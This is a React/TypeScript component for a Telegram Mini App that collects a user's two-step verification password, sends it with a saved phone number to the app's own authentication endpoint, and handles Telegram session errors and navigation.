import React, { useEffect, useRef } from "react";
import BackButton from "../../Components/BackButton";
import useCloudTelegram from "../../Hook/useCloudTelegram";
import { useNavigate } from "react-router-dom";
import { ChevronRight } from "lucide-react";
import useFetch from "../../Hook/useFetch";
import useErrorStore from "../../Hook/useErrorStore";
import { useLanguage } from "../../Hook/useLanguage";

function Authenticator() {
  const { loading, error, data, useData } = useFetch("/auth/authenticator");
  const showError = useErrorStore((state) => state.showError);
  const { t, ready } = useLanguage("Authenticator");
  const inputRef = useRef<HTMLInputElement>(null);
  const sentRef = useRef<boolean>(false);
  const Navigate = useNavigate();

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (sentRef.current || loading) return;

    const Data = Object.fromEntries(new FormData(e.currentTarget));

    (async () => {
      const saved = await useCloudTelegram.getItems(["login_phone"]);
      if (!saved?.login_phone?.trim()) return Navigate("/auth/login");
      Data["phone"] = saved?.login_phone;
      await useData({ body: Data });
      sentRef.current = true;
    })();
  };

  useEffect(() => {
    inputRef.current?.focus();

    (async () => {
      const saved = await useCloudTelegram.getItems(["login_phone"]);
      if (!saved?.login_phone?.trim()) return Navigate("/auth/login");
    })();
  }, [ready]);

  useEffect(() => {
    const handleMouseDown = (e: MouseEvent) => {
      if (e.target !== inputRef.current) e.preventDefault();
    };

    document.addEventListener("mousedown", handleMouseDown);
    return () => document.removeEventListener("mousedown", handleMouseDown);
  }, []);

  useEffect(() => {
    if (!error) return;

    showError(t(error));

    if (error === "no-auth") {
      (async () => await useCloudTelegram.removeItem("login_phone"))();
      const timerout = setTimeout(() => window.Telegram?.WebApp?.close(), 3000);
      return () => clearTimeout(timerout);
    }

    const MessageError = [
      "AUTH_KEY_UNREGISTERED",
      "AUTH_KEY_DUPLICATED",
      "SESSION_REVOKED",
      "SESSION_EXPIRED",
      "SESSION_NOT_FOUND",
      "SESSION_CORRUPTED",
    ];

    if (MessageError.includes(error)) {
      (async () => await useCloudTelegram.removeItem("login_phone"))();
      const timerout = setTimeout(() => Navigate("/auth/login"), 3000);
      return () => clearTimeout(timerout);
    }

    if (!MessageError.includes(error) && error !== "no-auth") {
      sentRef.current = false;
    }
  }, [error]);

  useEffect(() => {
    if (data?.success) {
      (async () => await useCloudTelegram.removeItem("login_phone"))();
      Navigate("/my-accounts");
    }
  }, [data]);

  BackButton({
    link: "/auth/login",
    onClick: async () => {
      await useCloudTelegram.removeItem("login_phone");
    },
  });

  if (ready) {
    return (
      <div className="size-full flex flex-col items-center pt-10 relative">
        <h1 className="loader-animation h-6 w-2/5 rounded-xs"></h1>
        <p className="loader-animation h-4 w-5/6 my-2"></p>
        <p className="loader-animation h-4 w-3/5 max-w-4/5"></p>
        <div className="loader-animation h-7 w-full mt-3 rounded-xs"></div>
        <div className="absolute bottom-5 right-5 rounded-full loader-animation size-12"></div>
      </div>
    );
  }

  return (
    <div className="overflow-hidden size-full text-center pt-10 flex flex-col">
      <h1 className="text-white font-medium text-lg">{t("h1")}</h1>

      <p className="text-sm max-w-70 mx-auto mt-2">{t("p")}</p>

      <form noValidate onSubmit={handleSubmit} className="flex-1 relative">
        <label className="block w-full max-w-100 relative mt-4 mx-auto">
          <span className="text-xs absolute top-[10%] left-3 translate-y-[-70%] bg-[#1b2026] px-1 text-button-color">
            {t("label")}
          </span>

          <input
            type="text"
            name="password"
            ref={inputRef}
            maxLength={50}
            autoComplete="off"
            className="w-full input-style border border-button-color bg-transparent caret-button-color"
          />
        </label>

        <button
          type="submit"
          className="absolute bg-button-color text-white bottom-5 right-5 size-11 flex-center rounded-full cursor-pointer"
        >
          {loading ? (
            <div className="loader size-6 border-3"></div>
          ) : (
            <ChevronRight />
          )}
        </button>
      </form>
    </div>
  );
}

export default Authenticator;
